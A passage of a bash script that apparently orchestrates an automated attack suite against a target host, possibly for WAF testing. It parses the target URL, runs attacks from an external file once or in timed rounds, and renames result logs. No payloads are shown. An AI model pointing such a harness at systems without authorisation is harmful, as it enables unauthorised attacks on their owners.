echo "[*] Attack file: $ATTACK_FILE"
echo "[*] WAF Mode: $WAF_MODE"
echo "[*] Attack Type: $ATTACK_TYPE"
echo "[DEBUG] ATTACK_FILE variable: $ATTACK_FILE"
echo "[DEBUG] File exists: $(ls -la "$ATTACK_FILE" 2>/dev/null || echo 'File not found')"
if [[ -n "$START_LINE" && -n "$END_LINE" ]]; then
    echo "[*] Executing attacks from line $START_LINE to $END_LINE"
else
    echo "[*] Executing all attacks"
fi

# Set up environment variables
echo "Setting up environment variables..."
export TARGET_HOST=$(echo "$TARGET" | sed 's|^https*://||' | sed 's|/.*$||')
export TARGET_PORT=$(echo "$TARGET" | sed 's|^https*://[^/]*:\([0-9]*\).*|\1|' | sed 's|^https*://[^/]*$|80|')
# ATTACK_TYPE is already set from command line arguments
export ATTACK_PHASE="automated"
export VARIANT_ID="full_attack_suite"

echo "Environment variables set:"
echo "  TARGET_HOST: $TARGET_HOST"
echo "  TARGET_PORT: $TARGET_PORT"
echo "  ATTACK_TYPE: $ATTACK_TYPE"
echo "  ATTACK_PHASE: $ATTACK_PHASE"
echo "  VARIANT_ID: $VARIANT_ID"

echo "Starting Comprehensive Attack Script..."
echo "Ready to start attacks immediately..."

# Duration-aware attack execution function
execute_attacks() {
    if [[ -n "$DURATION" && "$DURATION" -gt 0 ]]; then
        echo "[*] Running attacks for $DURATION seconds with repeated execution"
        start_time=$(date +%s)
        end_time=$((start_time + DURATION))
        round=1
        
        while [ $(date +%s) -lt $end_time ]; do
            echo "[*] Attack round $round ($(date))"
            
            # Reset counters for this round
            SUCCESS_COUNT=0
            FAILED_COUNT=0
            EXECUTED_COUNT=0
            
            execute_attacks_once
            
            # Check if we should continue
            current_time=$(date +%s)
            remaining_time=$((end_time - current_time))
            
            if [ $remaining_time -gt 5 ]; then
                echo "[*] Round $round completed. Waiting 5 seconds before next round..."
                sleep 5
            elif [ $remaining_time -gt 0 ]; then
                echo "[*] Round $round completed. Waiting $remaining_time seconds..."
                sleep $remaining_time
            fi
            
            round=$((round + 1))
        done
        
        echo "[*] Duration-based attack execution completed after $DURATION seconds"
    else
        echo "[*] Running attacks once (no duration specified)"
        execute_attacks_once
    fi
}

# Execute attacks
execute_attacks

echo "[*] ========================================"
echo "[*] ATTACK EXECUTION COMPLETED"
echo "[*] ========================================"
echo "[*] All attacks have been executed successfully"

# Rename log file with attack type
if [[ -n "$ATTACK_TYPE" ]]; then
    # Use the saved log file name
    current_log_file="/logs/${LOG_FILENAME}"
    target_log_file="/logs/attack_${ATTACK_TYPE}.log"
    
    echo "[*] Attempting to rename log file..."
    echo "[*] Current: $current_log_file"
    echo "[*] Target: $target_log_file"
    
    # Check if current file exists
    if [[ -f "$current_log_file" ]]; then
        echo "[*] Current log file exists, attempting rename..."
        if mv "$current_log_file" "$target_log_file"; then
            echo "[*] Successfully renamed to: $target_log_file"
        else
            echo "[*] Failed to rename, keeping original name: $current_log_file"
        fi
    else
        echo "[*] Current log file not found: $current_log_file"
        echo "[*] Check /logs/attack_${ATTACK_TYPE}.log for detailed results"
    fi
else
    echo "[*] Check /logs/${LOG_FILENAME} for detailed results"
fi


